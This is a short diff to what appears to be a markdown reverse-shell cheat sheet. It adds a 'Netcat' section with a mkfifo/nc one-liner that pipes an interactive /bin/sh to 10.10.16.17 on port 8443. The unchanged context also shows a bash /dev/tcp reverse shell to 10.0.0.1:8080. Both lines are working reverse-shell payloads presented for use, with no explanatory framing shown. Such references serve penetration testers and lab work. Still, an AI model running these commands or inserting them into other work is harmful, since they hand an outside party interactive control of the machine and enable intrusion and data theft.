@@ -21,6 +21,11 @@ bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
 ```
 ### php
 
+### Netcat
+
+```bash
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.17 8443 >/tmp/f
+```
 
 ## Windows
 
